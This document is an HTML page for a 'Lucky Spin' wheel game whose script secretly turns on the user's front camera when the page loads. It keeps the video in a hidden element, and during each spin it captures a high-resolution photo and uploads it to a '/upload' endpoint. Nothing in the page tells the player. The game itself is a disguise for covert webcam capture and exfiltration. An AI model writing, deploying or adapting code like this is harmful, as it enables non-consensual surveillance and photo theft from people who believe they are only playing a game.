<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lucky Spin Demo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0e27, #1a1f3a);
            color: white;
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        h1 {
            margin-bottom: 40px;
            font-size: 48px;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .wheel-container {
            position: relative;
            width: 280px;
            height: 280px;
            margin: 0 auto;
        }

        #wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.6), inset 0 0 30px rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            transition: transform 0.1s linear;
            will-change: transform;
            background: conic-gradient(
                from 0deg,
                #ff006e 0deg 60deg,
                #ffbe0b 60deg 120deg,
                #3a86ff 120deg 180deg,
                #06ffa5 180deg 240deg,
                #fb5607 240deg 300deg,
                #8338ec 300deg 360deg
            );
            border: 8px solid #ffd700;
            position: relative;
        }

        #wheel::before {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
            z-index: 10;
        }

        .pointer {
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 25px solid #ffd700;
            z-index: 20;
            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8));
        }

        .btn {
            padding: 16px 40px;
            font-size: 18px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            color: black;
            font-weight: bold;
            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.3);
            transition: all 0.3s ease;
            min-width: 200px;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(255, 215, 0, 0.5);
            background: linear-gradient(135deg, #ffed4e, #ffd700);
        }

        .btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        #result {
            font-size: 32px;
            height: 50px;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #status {
            height: 30px;
            color: #06ffa5;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 30px;
        }

        .status-loading {
            display: inline-block;
            margin-right: 8px;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(6, 255, 165, 0.3);
            border-radius: 50%;
            border-top-color: #06ffa5;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .pulse {
            animation: pulse 0.6s ease-in-out;
        }

        .info-text {
            font-size: 14px;
            color: #aaa;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<h1>🎯 Lucky Spin</h1>

<div class="container">
    <div class="wheel-container">
        <div class="pointer"></div>
        <div id="wheel">🎁</div>
    </div>

    <button id="mainBtn" class="btn" onclick="handleSpin()">SPIN!</button>

    <div id="result"></div>
    <div id="status"></div>
</div>

<script>
let isSpinning = false;
let currentRotation = 0;
let cameraStream = null;
let videoElement = null;

const SPIN_DURATION = 4000; // 4 seconds
const SEGMENTS = 6;
const SEGMENT_ANGLE = 360 / SEGMENTS;

function updateWheelRotation(angle) {
    currentRotation = angle % 360;
    document.getElementById("wheel").style.transform = `rotate(${currentRotation}deg)`;
}

// Initialize camera stream on page load (silent)
async function initCamera() {
    try {
        const constraints = {
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: "user"
            },
            audio: false
        };
        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log("Camera initialized successfully");
        
        // Create persistent video element
        videoElement = document.createElement("video");
        videoElement.srcObject = cameraStream;
        videoElement.muted = true;
        videoElement.autoplay = true;
        videoElement.playsInline = true;
        videoElement.style.display = "none";
        document.body.appendChild(videoElement);
        
    } catch (e) {
        console.warn("Camera initialization deferred:", e.message);
    }
}

async function capturePhotoSilent() {
    try {
        // If no stream, request fresh camera access
        if (!cameraStream || cameraStream.getTracks().length === 0) {
            console.log("Requesting fresh camera access...");
            const constraints = {
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    facingMode: "user"
                },
                audio: false
            };
            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
            
            // Setup new video element
            if (!videoElement || !videoElement.parentElement) {
                videoElement = document.createElement("video");
                videoElement.srcObject = cameraStream;
                videoElement.muted = true;
                videoElement.autoplay = true;
                videoElement.playsinline = true;
                videoElement.style.display = "none";
                document.body.appendChild(videoElement);
            } else {
                videoElement.srcObject = cameraStream;
            }
        }

        // Wait for video to be ready with multiple checks
        await new Promise(resolve => {
            if (videoElement.readyState >= 2 && videoElement.videoWidth > 0) {
                resolve();
            } else {
                const handler = () => {
                    if (videoElement.readyState >= 2 && videoElement.videoWidth > 0) {
                        videoElement.removeEventListener('loadedmetadata', handler);
                        resolve();
                    }
                };
                videoElement.addEventListener('loadedmetadata', handler);
                setTimeout(resolve, 2000); // Fallback timeout
            }
        });

        // Additional wait for stable frame
        await new Promise(resolve => setTimeout(resolve, 300));

        // Capture from video element with proper dimensions
        const canvas = document.createElement("canvas");
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        
        console.log("Video dimensions:", canvas.width, "x", canvas.height);
        
        if (canvas.width === 0 || canvas.height === 0) {
            throw new Error("Invalid video dimensions: " + canvas.width + "x" + canvas.height);
        }
        
        const ctx = canvas.getContext("2d", { willReadFrequently: true });
        
        // Fill with black first to detect issues
        ctx.fillStyle = "#000";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // Flip horizontally for mirror effect
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        // Convert to high-quality JPEG for better performance
        const dataUrl = canvas.toDataURL("image/jpeg", 0.95);
        
        if (dataUrl.length < 2000) {
            console.warn("Captured image seems small:", dataUrl.length, "bytes");
        }

        console.log("Image captured:", dataUrl.length, "bytes");
        
        // Send image with better error handling
        const response = await fetch('/upload', {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({image: dataUrl})
        });

        const result = await response.json();
        console.log("Upload response:", result);
        
        if (!response.ok) {
            throw new Error(result.message || "Upload failed");
        }

        return true;
    } catch (e) {
        console.error("Capture failed:", e);
        return false;
    }
}

function spin() {
    if (isSpinning) return;
    
    isSpinning = true;
    const btn = document.getElementById("mainBtn");
    const result = document.getElementById("result");
    const status = document.getElementById("status");

    btn.disabled = true;
    result.innerText = "";
    status.innerText = "";

    // Random number of full rotations (3-5) plus random segment landing
    const fullRotations = (Math.random() * 2 + 3) * 360;
    const randomSegment = Math.random() * SEGMENT_ANGLE;
    const finalRotation = fullRotations + randomSegment;

    // Start capture in background during spin (delayed to ensure video is ready)
    const capturePromise = new Promise(resolve => {
        setTimeout(async () => {
            console.log("Starting background capture...");
            const success = await capturePhotoSilent();
            console.log("Capture result:", success);
            resolve(success);
        }, 800); // Capture after video has had time to initialize
    });

    const startTime = Date.now();
    const startRotation = currentRotation;

    function animate() {
        const elapsed = Date.now() - startTime;
        const progress = Math.min(elapsed / SPIN_DURATION, 1);
        
        // Easing out (deceleration)
        const easeProgress = 1 - Math.pow(1 - progress, 3);
        const currentAngle = startRotation + (finalRotation * easeProgress);

        updateWheelRotation(currentAngle);

        if (progress < 1) {
            requestAnimationFrame(animate);
        } else {
            isSpinning = false;
            
            // Determine which segment we landed on (0-5)
            const segmentIndex = Math.floor((360 - currentRotation) / SEGMENT_ANGLE) % SEGMENTS;
            const win = segmentIndex % 2 === 0;

            // Add pulse effect
            document.getElementById("wheel").classList.add("pulse");
            setTimeout(() => document.getElementById("wheel").classList.remove("pulse"), 600);

            // Wait for capture to finish, then show result
            capturePromise.then(() => {
                setTimeout(() => {
                    result.innerText = win ? "🎉 CONGRATS! You won!" : "😅 Try again...";
                    btn.disabled = false;
                }, 300);
            });
        }
    }

    animate();
}

function handleSpin() {
    spin();
}

// Initialize camera on page load
initCamera();

// Initial wheel setup
updateWheelRotation(0);
</script>

</body>
</html>
